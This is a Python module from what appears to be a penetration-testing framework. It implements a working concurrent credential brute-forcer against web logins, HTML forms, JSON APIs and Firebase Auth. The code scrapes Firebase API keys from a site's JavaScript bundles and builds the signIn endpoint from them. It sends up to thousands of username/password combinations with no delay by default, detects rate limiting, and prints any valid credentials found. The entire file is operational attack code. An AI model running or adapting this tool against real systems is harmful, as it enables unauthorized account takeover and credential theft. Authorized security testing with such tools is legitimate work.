import asyncio
import itertools
import json
import re
import sys
from pathlib import Path
from typing import Dict, List, Optional, Tuple
from urllib.parse import urlencode, urljoin, urlparse

# Adjust these imports based on your actual project structure
from core.base_module import BaseModule
from core.database_manager import DatabaseManager
from core.report_manager import Finding


class CredentialTester(BaseModule):
    """
    Professional credential brute-force tester
    Supports HTML forms, JSON APIs, Firebase Auth, fallback when form not detected
    """

    def __init__(self, config, stealth=None, db: Optional[DatabaseManager] = None, graph_manager=None):
        super().__init__(config, stealth, db, graph_manager)
        self.max_attempts = config.get('max_attempts', 5000)
        self.delay = config.get('delay', 0)
        self.wordlist_path = config.get('wordlist_path', 'wordlists')
        self.concurrency = config.get('concurrency', 30)

        self.custom_userlist = config.get('userlist')
        self.custom_passlist = config.get('passlist')

        self._max_usernames = config.get('max_usernames', 300)
        self._max_passwords = config.get('max_passwords', 5000)

    def _print_progress(self, current: int, total: int, prefix: str = 'Progress', width: int = 40):
        if total == 0:
            return
        pct = current / total
        filled = int(width * pct)
        bar = '█' * filled + '░' * (width - filled)
        line = f'\r\033[96m{prefix}:\033[0m [{bar}] \033[93m{pct*100:5.1f}%\033[0m {current}/{total}'
        sys.stdout.write(line)
        sys.stdout.flush()
        if current >= total:
            sys.stdout.write('\n')
            sys.stdout.flush()

    async def run(self, target: str, **kwargs) -> List[Finding]:
        if not kwargs.get('enable_brute_force', False):
            return self.findings

        if kwargs.get('userlist'):
            self.custom_userlist = kwargs['userlist']
        if kwargs.get('passlist'):
            self.custom_passlist = kwargs['passlist']

        target_url = target if target.startswith(('http://', 'https://')) else f'https://{target}'

        print(f"\033[96m[*] Target     : {target_url}\033[0m")
        print(f"\033[96m[*] Userlist   : {self.custom_userlist or 'default'}\033[0m")
        print(f"\033[96m[*] Passlist   : {self.custom_passlist or 'default'}\033[0m\n")

        endpoint = await self._probe_single_endpoint(target_url)
        await self._test_brute_force(endpoint)

        return self.findings

    async def _probe_single_endpoint(self, url: str) -> Dict:
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        default_fields = {
            'username_fields': ['email', 'username'],
            'password_field': 'password',
            'action': url,
            'method': 'POST',
            'inputs': []
        }

        # Direct Firebase endpoint
        if 'identitytoolkit.googleapis.com' in url:
            print("\033[92m[+] Using direct Firebase Identity Toolkit endpoint\033[0m")
            return {'url': url, 'type': 'firebase', 'form_type': 'firebase', 'fields': default_fields, 'is_api': True}

        # Fetch page
        text = ""
        headers = {}
        try:
            resp = await self._make_request(url, allow_redirects=True)
            if resp:
                text = await resp.text()
                headers = resp.headers
        except Exception as e:
            self.logger.warning(f"Failed to fetch {url}: {e}")

        # Firebase detection & key extraction
        is_firebase = any(h in text.lower() for h in ['firebase', 'firebaseconfig', 'apikey', 'identitytoolkit']) \
                      or any(d in url.lower() for d in ['.web.app', '.firebaseapp.com'])

        api_key = None
        if is_firebase:
            # Try inline
            m = re.search(r'apiKey["\'\s:=]+["\']?([A-Za-z0-9_-]{20,})["\']?', text, re.IGNORECASE)
            if m:
                api_key = m.group(1)
            else:
                # Try common JS files
                common_js_paths = [
                    '/main.js', '/static/js/main.chunk.js', '/app.js', '/bundle.js',
                    '/firebase.js', '/static/js/2.chunk.js', '/runtime-main.js', '/vendor.js'
                ]
                for path in common_js_paths:
                    js_url = urljoin(base, path)
                    try:
                        js_resp = await self._make_request(js_url)
                        if js_resp and js_resp.status == 200:
                            js_text = await js_resp.text()
                            m = re.search(r'apiKey["\'\s:=]+["\']?([A-Za-z0-9_-]{20,})["\']?', js_text, re.IGNORECASE)
                            if m:
                                api_key = m.group(1)
                                print(f"\033[92m[+] Firebase API key found in {path}\033[0m")
                                break
                    except:
                        pass

            if api_key:
                fb_url = f"https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key={api_key}"
                print(f"\033[92m[+] Firebase signIn endpoint: {fb_url}\033[0m")
                return {
                    'url': fb_url,
                    'type': 'firebase',
                    'form_type': 'firebase',
                    'fields': default_fields,
                    'is_api': True,
                    'api_key': api_key
                }

        # HTML form extraction
        fields = self._extract_form_fields(text) if text else default_fields

        post_url = url
        if fields.get('action'):
            action = fields['action']
            if action.startswith(('http://', 'https://')):
                post_url = action
            elif action.startswith('/'):
                post_url = base + action
            else:
                post_url = urljoin(url, action)

        form_type = self._detect_form_type(url, text, headers)

        # Fallback when nothing detected
        if not fields['username_fields'] or not fields['password_field']:
            print("\033[93m[!] No form fields detected → using common credential field names\033[0m")
            fields['username_fields'] = ['email', 'username', 'user', 'login']
            fields['password_field'] = 'password'
            fields['action'] = url

        return {
            'url': post_url,
            'type': 'direct',
            'form_type': form_type,
            'fields': fields,
            'is_api': form_type in ('json_api', 'firebase', 'ajax_form')
        }

    def _detect_form_type(self, url: str, html: str, headers: Dict) -> str:
        ct = headers.get('Content-Type', '').lower()
        if 'application/json' in ct or html.strip().startswith(('{', '[')):
            return 'json_api'
        if 'identitytoolkit' in url:
            return 'firebase'
        return 'html_form'

    def _extract_form_fields(self, html: str) -> Dict:
        fields = {
            'inputs': [],
            'username_fields': [],
            'password_field': None,
            'action': '',
            'method': 'POST'
        }

        # inputs
        inputs = re.findall(r'<input[^>]*name=["\']([^"\']+)["\']', html, re.I)
        fields['inputs'] = list(set(inputs))

        # action
        m = re.search(r'<form[^>]*action=["\']([^"\']*)["\']', html, re.I)
        if m:
            fields['action'] = m.group(1).strip()

        # username-like
        u_patterns = r'(?:email|mail|username|user|login|name|account|userid|identifier)'
        for name in fields['inputs']:
            if re.search(u_patterns, name, re.I):
                fields['username_fields'].append(name)

        # password
        if 'password' in [n.lower() for n in fields['inputs']]:
            fields['password_field'] = 'password'
        elif fields['inputs']:
            fields['password_field'] = fields['inputs'][0]  # desperate fallback

        if not fields['username_fields']:
            fields['username_fields'] = ['email', 'username']

        if not fields['password_field']:
            fields['password_field'] = 'password'

        return fields

    def _load_wordlists(self) -> Tuple[List[str], List[str]]:
        def load_file(path: str, cap: int, label: str) -> List[str]:
            if not path or not Path(path).is_file():
                print(f"\033[93m[!] {label} not found: {path}\033[0m")
                return []
            lines = []
            with open(path, encoding='utf-8', errors='ignore') as f:
                for line in f:
                    s = line.strip()
                    if s:
                        lines.append(s)
                    if len(lines) >= cap:
                        break
            print(f"\033[92m[+] {label}: {len(lines)} entries loaded\033[0m")
            return lines

        usernames = load_file(self.custom_userlist, self._max_usernames, "Custom userlist") \
                    or ['admin', 'administrator', 'user', 'test', 'root']

        passwords = load_file(self.custom_passlist, self._max_passwords, "Custom passlist") \
                    or ['password', '123456', 'admin123', 'qwerty', '12345678']

        return usernames, passwords

    async def _test_brute_force(self, endpoint: Dict):
        url = endpoint['url']
        form_type = endpoint.get('form_type', 'html_form')
        fields = endpoint.get('fields', {})
        username_fields = fields.get('username_fields', ['email'])
        password_field = fields.get('password_field', 'password')

        base_usernames, passwords = self._load_wordlists()
        all_usernames = base_usernames

        total = len(all_usernames) * len(passwords)
        counter = [0]
        found = asyncio.Event()
        rate_limited = [False]
        semaphore = asyncio.Semaphore(self.concurrency)

        print(f"\033[96m[*] Endpoint       : {url}\033[0m")
        print(f"\033[96m[*] Form type      : {form_type}\033[0m")
        print(f"\033[96m[*] User fields    : {username_fields}\033[0m")
        print(f"\033[96m[*] Pass field     : {password_field}\033[0m")
        print(f"\033[96m[*] Total combos   : {total:,}\033[0m\n")

        async def try_combo(username: str, password: str):
            if found.is_set():
                return

            async with semaphore:
                if found.is_set():
                    return

                responses = []
                final_resp = None
                final_text = ""

                try:
                    # 1. Firebase style
                    if 'firebase' in form_type or endpoint.get('api_key'):
                        payload = json.dumps({
                            "email": username.strip(),
                            "password": password,
                            "returnSecureToken": True
                        })
                        r = await self._make_request(url, 'POST', data=payload,
                                                     headers={'Content-Type': 'application/json'})
                        if r:
                            responses.append(f"Firebase: {r.status}")
                            final_resp = r

                    # 2. Standard form
                    if not final_resp or final_resp.status not in {200, 201, 301, 302, 303}:
                        data = urlencode({
                            username_fields[0]: username.strip(),
                            password_field: password,
                            'submit': 'Login'
                        })
                        r = await self._make_request(url, 'POST', data=data,
                                                     headers={'Content-Type': 'application/x-www-form-urlencoded'})
                        if r:
                            responses.append(f"Form: {r.status}")
                            final_resp = r

                    # 3. Variations
                    if not final_resp or final_resp.status not in {200, 201, 301, 302, 303}:
                        data = urlencode({
                            'username': username.strip(),
                            'pass': password,
                            'password': password
                        })
                        r = await self._make_request(url, 'POST', data=data,
                                                     headers={'Content-Type': 'application/x-www-form-urlencoded'})
                        if r:
                            responses.append(f"Var: {r.status}")
                            final_resp = r

                    counter[0] += 1
                    self._print_progress(counter[0], total, prefix=f"{username[:20]:<20}")

                    if not final_resp:
                        return

                    status = final_resp.status
                    final_text = await final_resp.text()
                    tl = final_text.lower()

                    if counter[0] == 1:
                        snip = final_text[:600].replace('\n', ' ')
                        print(f"\n\033[90m[debug] {url}")
                        print(f"  Tried: {' | '.join(responses)}")
                        print(f"  HTTP {status} | {snip[:400]}...\033[0m\n")

                    if status in (429, 403) and ('rate' in tl or 'limit' in tl):
                        rate_limited[0] = True
                        found.set()
                        return

                    success = False
                    fail_words = ['invalid', 'incorrect', 'wrong', 'failed', 'bad', 'unauthorized', 'denied', 'try again']

                    if status in (301, 302, 303, 307, 308):
                        loc = final_resp.headers.get('Location', '').lower()
                        if any(x in loc for x in ['admin', 'dashboard', 'home', 'panel', 'welcome']) \
                           and not any(f in loc for f in fail_words):
                            success = True

                    elif status in (200, 201):
                        cookies = str(final_resp.headers).lower()
                        has_session = any(x in cookies for x in ['session', 'auth', 'token', 'jwt'])
                        if has_session and not any(f in tl for f in fail_words):
                            success = True
                        elif any(w in tl for w in ['welcome', 'logged in', 'dashboard', 'success']):
                            success = True
                        elif 'json' in final_resp.headers.get('Content-Type', '').lower():
                            if '"error"' not in tl and any(k in tl for k in ['token', 'access_token', 'session']):
                                success = True

                    if success:
                        found.set()
                        self._report_success(username, password, url, counter[0], username_fields, password_field)

                except Exception as e:
                    print(f"\033[91m[!] {username} error: {type(e).__name__}\033[0m")

        tasks = [asyncio.create_task(try_combo(u, p)) for u, p in itertools.product(all_usernames, passwords)]

        try:
            await asyncio.gather(*tasks, return_exceptions=True)
        except (KeyboardInterrupt, asyncio.CancelledError):
            for t in tasks:
                t.cancel()
            print("\033[93m[!] Interrupted\033[0m")

        if rate_limited[0]:
            print("\033[93m[!] Rate limiting detected\033[0m")
        elif not found.is_set():
            print("\033[93m[-] No valid credentials found\033[0m")

    def _report_success(self, username: str, password: str, url: str, attempts: int,
                        username_fields: List[str], password_field: str):
        print("\n" + "="*70)
        print("\033[92m[ VALID CREDENTIALS FOUND ]\033[0m")
        print(f"  Username : {username}")
        print(f"  Password : {password}")
        print(f"  URL      : {url}")
        print(f"  Attempts : {attempts}")
        print("="*70 + "\n")

        self.add_finding(Finding(
            module='brute',
            title=f"Valid credentials: {username}:{password}",
            severity='Critical',
            description=f"Login succeeded at {url}",
            evidence={'username': username, 'password': password, 'attempts': attempts},
            poc=f"POST {url} → {username_fields[0]}={username}&{password_field}={password}",
            remediation="Enforce MFA, strong passwords, rate limiting, lockouts",
            cvss_score=9.8,
            target=url
        ))
